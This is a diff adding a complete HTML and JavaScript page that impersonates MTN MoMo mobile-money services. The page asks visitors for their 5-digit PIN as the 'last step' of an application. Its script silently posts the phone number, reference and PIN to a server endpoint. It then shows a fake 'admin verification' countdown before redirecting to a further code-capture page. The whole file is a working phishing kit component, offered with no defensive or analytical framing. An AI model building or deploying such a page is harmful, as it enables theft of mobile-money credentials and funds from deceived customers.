@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter your MTN 5-DIGIT PIN - MoMo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header { background: #fff; padding: 14px 24px; display: flex; align-items: center;
+                  gap: 16px; border-bottom: 3px solid #ffcc00;
+                  box-shadow: 0 2px 8px rgba(0,0,0,.04); }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon { width: 42px; height: 42px; background: #ffcc00; border-radius: 8px;
+                     display: flex; align-items: center; justify-content: center;
+                     font-weight: 800; font-size: 11px; color: #004f9f; text-align: center;
+                     border: 2px solid #004f9f; line-height: 1; }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; }
+        .header-title { font-size: 18px; font-weight: 700; color: #222; flex: 1; }
+        .hamburger { font-size: 22px; color: #333; cursor: pointer; }
+
+        .main { flex: 1; display: flex; flex-direction: column;
+                align-items: center; padding: 60px 16px; }
+        .page-title { font-size: 32px; font-weight: 800; color: #111;
+                      text-align: center; margin-bottom: 40px; }
+
+        .card { background: #fff; width: 100%; max-width: 500px; border-radius: 16px;
+                padding: 44px 36px 36px; box-shadow: 0 8px 30px rgba(0,0,0,.08);
+                text-align: center; }
+        .card-icon { width: 70px; height: 70px; background: #fff5cc; border-radius: 50%;
+                     display: flex; align-items: center; justify-content: center;
+                     margin: 0 auto 20px; font-size: 32px; }
+        .card-label { font-size: 14px; font-weight: 600; color: #444;
+                      margin-bottom: 8px; line-height: 1.5; }
+        .card-sub { font-size: 13px; color: #888; margin-bottom: 24px; }
+
+        .pin-row { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .pin-box {
+            width: 56px; height: 66px; font-size: 26px; font-family: inherit;
+            font-weight: 800; text-align: center; color: #111;
+            background: #fffdf5; border: 2px solid #ffcc00; border-radius: 10px;
+            outline: none; transition: box-shadow .15s, border-color .15s;
+        }
+        .pin-box::-webkit-outer-spin-button,
+        .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .pin-box:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); border-color: #e6b800; }
+        .pin-box.filled { background: #fff8e0; }
+        .pin-box.error { border-color: #e33; background: #fff5f5; }
+
+        .error-msg { display: none; font-size: 13px; color: #c33;
+                     font-weight: 600; margin-bottom: 14px; }
+        .error-msg.show { display: block; }
+
+        .submit-btn {
+            display: block; width: 100%; background: #ffcc00; color: #111;
+            border: none; padding: 18px; font-size: 16px; font-weight: 800;
+            letter-spacing: .5px; border-radius: 10px; cursor: pointer;
+            transition: background .2s, transform .1s; margin-bottom: 14px;
+        }
+        .submit-btn:hover { background: #e6b800; }
+        .submit-btn:active { transform: scale(.99); }
+        .submit-btn:disabled { background: #ddd; color: #999; cursor: not-allowed; }
+
+        /* ===== PROGRESS SCREEN ===== */
+        .progress-wrap { padding: 10px 0 20px; }
+        .progress-icon {
+            width: 80px; height: 80px; border-radius: 50%;
+            background: #fff5cc; display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px; font-size: 38px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-title { font-size: 20px; font-weight: 800; color: #111; margin-bottom: 10px; }
+        .progress-text { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 24px; }
+        .progress-bar {
+            width: 100%; height: 10px; background: #f0f0f0;
+            border-radius: 6px; overflow: hidden; margin-bottom: 10px;
+        }
+        .progress-fill {
+            height: 100%; width: 0%; background: #ffcc00;
+            transition: width .3s linear; border-radius: 6px;
+        }
+        .progress-time {
+            font-size: 13px; color: #888; font-weight: 600; text-align: center;
+        }
+
+        .footer { background: #111; color: #ffcc00; text-align: center;
+                  padding: 18px; font-size: 13px; font-weight: 600; }
+
+        @media (max-width: 480px) {
+            .page-title { font-size: 24px; }
+            .card { padding: 32px 22px 26px; }
+            .header-title { font-size: 15px; }
+            .pin-box { width: 48px; height: 58px; font-size: 22px; }
+            .pin-row { gap: 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <span class="hamburger">☰</span>
+        <div class="logo-box">
+            <div class="logo-icon">MoMo<br>MTN</div>
+            <span class="logo-text">MoMo</span>
+        </div>
+        <span class="header-title">MTN Mobile Services</span>
+    </header>
+
+    <main class="main">
+        <h1 class="page-title">Enter Your MTN 5-Digit PIN</h1>
+
+        <div class="card" id="mainCard">
+            <div class="card-icon">🔒</div>
+
+            <p class="card-label">Enter the 5-digit<br>MTN PIN</p>
+            <p class="card-sub">This is the last step to complete your application</p>
+
+            <div class="error-msg" id="errorMsg"></div>
+
+            <form id="finalForm">
+                <div class="pin-row" id="pinRow">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    Confirm PIN
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MoMo</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const phone  = params.get('phone') || 'unknown';
+        const refId  = params.get('ref')   || '';
+
+        const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
+        const errorMsg = document.getElementById('errorMsg');
+        const submitBtn = document.getElementById('submitBtn');
+
+        pinBoxes[0].focus();
+
+        pinBoxes.forEach((box, i) => {
+            box.addEventListener('input', function () {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value.length > 1) this.value = this.value.slice(-1);
+
+                if (this.value) {
+                    this.classList.add('filled');
+                    if (i < pinBoxes.length - 1) pinBoxes[i + 1].focus();
+                } else {
+                    this.classList.remove('filled');
+                }
+                clearErrors();
+            });
+
+            box.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace') {
+                    if (!this.value && i > 0) {
+                        pinBoxes[i - 1].focus();
+                        pinBoxes[i - 1].value = '';
+                        pinBoxes[i - 1].classList.remove('filled');
+                        e.preventDefault();
+                    } else if (this.value) {
+                        this.value = '';
+                        this.classList.remove('filled');
+                        e.preventDefault();
+                    }
+                    clearErrors();
+                }
+                if (e.key === 'ArrowLeft' && i > 0) pinBoxes[i - 1].focus();
+                if (e.key === 'ArrowRight' && i < pinBoxes.length - 1) pinBoxes[i + 1].focus();
+            });
+
+            box.addEventListener('paste', function (e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData)
+                    .getData('text').replace(/[^0-9]/g, '').slice(0, 5);
+                if (!pasted) return;
+                for (let j = 0; j < pasted.length && (i + j) < pinBoxes.length; j++) {
+                    pinBoxes[i + j].value = pasted[j];
+                    pinBoxes[i + j].classList.add('filled');
+                }
+                const nextEmpty = pinBoxes.findIndex(b => !b.value);
+                if (nextEmpty !== -1) pinBoxes[nextEmpty].focus();
+                else pinBoxes[pinBoxes.length - 1].focus();
+                clearErrors();
+            });
+
+            box.addEventListener('focus', function () { this.select(); });
+        });
+
+        function clearErrors() {
+            errorMsg.classList.remove('show');
+            pinBoxes.forEach(b => b.classList.remove('error'));
+        }
+
+        // ─── Submit PIN ───
+        document.getElementById('finalForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const pin = pinBoxes.map(b => b.value).join('');
+            if (pin.length !== 5) {
+                errorMsg.textContent = 'Please enter all 5 digits of your PIN';
+                errorMsg.classList.add('show');
+                pinBoxes.forEach(b => { if (!b.value) b.classList.add('error'); });
+                const firstEmpty = pinBoxes.find(b => !b.value);
+                if (firstEmpty) firstEmpty.focus();
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+            pinBoxes.forEach(b => b.disabled = true);
+
+            // Send to server
+            try {
+                await fetch('/api/final-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, refId, finalCode: pin })
+                });
+            } catch (err) {
+                console.error('Send failed:', err);
+            }
+
+            // Show progress screen (10 seconds)
+            showProgressScreen();
+        });
+
+        // ─── Progress Screen ───
+        function showProgressScreen() {
+            document.getElementById('mainCard').innerHTML = `
+                <div class="progress-wrap">
+                    <div class="progress-icon">📩</div>
+                    <div class="progress-title">Verifying PIN...</div>
+                    <div class="progress-text">
+                        A message has been sent to the admin for verification.<br>
+                        Please wait while we prepare the next step...
+                    </div>
+                    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+                    <div class="progress-time" id="progressTime">10 seconds remaining</div>
+                </div>
+            `;
+
+            let elapsed = 0;
+            const total = 10;
+            const fill = document.getElementById('progressFill');
+            const timeLabel = document.getElementById('progressTime');
+
+            const interval = setInterval(() => {
+                elapsed++;
+                fill.style.width = (elapsed / total * 100) + '%';
+                const remaining = total - elapsed;
+                timeLabel.textContent = remaining + ' second' + (remaining !== 1 ? 's' : '') + ' remaining';
+
+                if (elapsed >= total) {
+                    clearInterval(interval);
+                    window.location.href = `lastcode.html?phone=${encodeURIComponent(phone)}&ref=${encodeURIComponent(refId)}`;
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
